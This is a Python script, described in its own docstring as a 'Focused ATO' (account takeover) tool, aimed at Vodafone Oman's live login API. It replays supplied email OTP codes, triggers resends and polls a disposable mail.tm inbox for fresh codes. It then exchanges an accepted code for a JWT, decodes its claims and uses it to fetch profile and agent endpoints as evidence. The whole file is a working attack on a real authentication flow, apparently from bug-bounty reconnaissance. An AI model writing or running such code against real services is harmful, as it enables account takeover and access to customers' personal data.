#!/usr/bin/env python3
"""Focused ATO: try live code(s); fallback = self-issued code with long
mail.tm-delay-tolerant inbox wait. Writes oto4_result.json."""
import base64, hashlib, json, re, sys, time, uuid
import urllib.error, urllib.parse, urllib.request

UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")
V1 = "https://vfo01.vodafone.om"
V2 = "https://vfo02.vodafone.om"
V3 = "https://vfo03.vodafone.om"
DIR = "/tmp/opencode/vfo"
OUT = DIR + "/oto4_result.json"

KNOWN = {"4699","9046","0645","5881","1931","9652","4639","0773","2120",
         "7334","4032","2315","5260","4058","8311","9023","2352"}

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def req(base, path, body=None, ctype="application/json", bearer=None,
        method=None, timeout=40):
    h = {"User-Agent": UA, "Accept": "application/json",
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()),
         "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    if body is not None: h["Content-Type"] = ctype
    if bearer: h["Authorization"] = "Bearer " + bearer
    data = body.encode() if isinstance(body, str) else (
        json.dumps(body).encode() if body is not None else None)
    m = method or ("POST" if data is not None else "GET")
    r = urllib.request.Request(base + path, data=data, headers=h, method=m)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def mail(u, tok):
    r = urllib.request.Request(u, headers={"Authorization": "Bearer " + tok,
                                           "User-Agent": "h1.recon"})
    return urllib.request.urlopen(r, timeout=30).read().decode()

def start_session():
    v = (b64u(uuid.uuid4().bytes) + b64u(uuid.uuid4().bytes))[:64]
    ch = b64u(hashlib.sha256(v.encode()).digest())
    st, b = req(V1, "/auth/api/public/login/v1/start",
                {"clientId": "MVA", "responseType": "code", "scope": "openid",
                 "codeChallengeMethod": "S256", "codeChallenge": ch,
                 "state": str(uuid.uuid4())})
    if st != 200 or not b.lstrip().startswith("{"):
        raise RuntimeError("start %s %s" % (st, b[:80]))
    j = json.loads(b)
    return j["temporaryAccessToken"], j["nextStep"]["emailOtpMethod"]["secretPayload"], v

def auth(tmp, sp, email, otp, resend):
    return req(V1, "/auth/api/public/login/v1/authenticate",
               {"authToken": {"emailOtpToken": {"secretPayload": sp,
                                                "email": email, "otp": otp,
                                                "resend": resend}},
                "temporaryAccessToken": tmp})

def exchange(code, verifier):
    st, b = req(V1, "/auth/api/public/access-token/v1",
                urllib.parse.urlencode({"client_id": "MVA", "scope": "openid",
                                        "code_verifier": verifier, "code": code,
                                        "grant_type": "authorization_code"}),
                ctype="application/x-www-form-urlencoded")
    return st, b

def newest_code(tok):
    ms = json.loads(mail("https://api.mail.tm/messages?sort=receivedAt:desc", tok))["hydra:member"]
    if not ms: return None
    d = json.loads(mail("https://api.mail.tm/messages/" + ms[0]["id"], tok))
    html = d.get("html") or ""
    if isinstance(html, list):
        html = " ".join(p.get("content","") if isinstance(p,dict) else str(p) for p in html)
    txt = d.get("text") or ""
    if isinstance(txt, list):
        txt = " ".join(str(p) for p in txt)
    m = re.search(r"otpCode=(\d{4})", html + " " + txt)
    return m.group(1) if m else None

rec = {"ts0": time.strftime("%H:%M:%SZ", time.gmtime()), "steps": []}
def log(**kw):
    kw["ts"] = time.strftime("%H:%M:%SZ", time.gmtime())
    rec["steps"].append(kw)
    print("[oto4] " + json.dumps(kw)[:300], flush=True)

email = sys.argv[1]
codes = sys.argv[2:]
tok = json.load(open(DIR + "/mailbox.json"))["token"]

jwt = None
# 1) session with retries
tmp = sp = verifier = None
for i in range(12):
    try:
        tmp, sp, verifier = start_session(); log(step="start", ok=True, i=i); break
    except Exception as e:
        log(step="start", ok=False, i=i, err=str(e)[:100]); time.sleep(30)
if tmp is None:
    log(result="no_session"); json.dump(rec, open(OUT,"w"), indent=2); sys.exit(1)

def try_code(c, src):
    global jwt
    st, b = auth(tmp, sp, email, c, False)
    step = {"step":"try","code":c,"src":src,"http":st,"raw":b[:3000]}
    try:
        j = json.loads(b)
        ns = (j.get("nextStep") or {}).get("emailOtpMethod") or {}
        step["otpStatus"] = ns.get("otpStatus")
        if "redirectUri" in j:
            step["accepted"] = True
            step["redirectUri"] = j["redirectUri"]
            m = re.search(r"code=([A-Za-z0-9_-]+)", j["redirectUri"])
            est, eb = exchange(m.group(1), verifier)
            j2 = json.loads(eb)
            jwt = j2["access_token"]
            seg = jwt.split(".")[1] + "=" * (-len(jwt.split(".")[1]) % 4)
            rec["claims"] = json.loads(base64.urlsafe_b64decode(seg))
            step["jwt_prefix"] = jwt[:40]
    except Exception:
        step["note"] = "non-JSON"
    rec["steps"].append(step)
    log(step="try", code=c, src=src, status=step.get("otpStatus", step.get("note")))
    return jwt

for c in codes:
    time.sleep(3)
    if try_code(c, "initial"): break

# 2) fallback: self-issue, wait up to 8 min for mail.tm delivery
if not jwt:
    for cyc in range(1, 4):
        time.sleep(5)
        st, b = auth(tmp, sp, email, None, True)
        try:
            j = json.loads(b)
            if j.get("temporaryAccessToken"): tmp = j["temporaryAccessToken"]
            ns = (j.get("nextStep") or {}).get("emailOtpMethod") or {}
            log(step="resend", cyc=cyc, status=ns.get("otpStatus"),
                exp=ns.get("otpExpiresIn"), rsend=ns.get("otpResendIn"))
            if ns.get("otpStatus") == "RESEND_LATER":
                wait = min(int(ns.get("otpResendIn") or 60) + 10, 240)
                time.sleep(wait); continue
        except Exception as e:
            log(step="resend", cyc=cyc, err=str(e)[:100]); time.sleep(30); continue
        for _ in range(32):  # up to ~8 min (mail.tm delay observed)
            time.sleep(15)
            try:
                c2 = newest_code(tok)
            except Exception as e:
                log(step="inbox_err", err=str(e)[:100]); continue
            if c2 and c2 not in KNOWN:
                log(step="new_inbox_code", code=c2)
                KNOWN.add(c2)
                if try_code(c2, "self_issue_%d" % cyc): break
        if jwt: break

if jwt:
    rec["jwt"] = jwt
    for name, (base, path) in {
        "vfo02_profile": (V2, "/api/public/profile/v1"),
        "vfo03_agents": (V3, "/chat/customer/v1/agents/availability"),
    }.items():
        time.sleep(3)
        st, b = req(base, path, bearer=jwt)
        rec["evidence_" + name] = {"http": st, "raw": b[:4000]}
        log(step="evidence", ep=name, http=st, raw=b[:200])

rec["result"] = "JWT_OBTAINED" if jwt else "no_hit"
rec["ts1"] = time.strftime("%H:%M:%SZ", time.gmtime())
json.dump(rec, open(OUT, "w"), indent=2)
print("[oto4] DONE", rec["result"], flush=True)
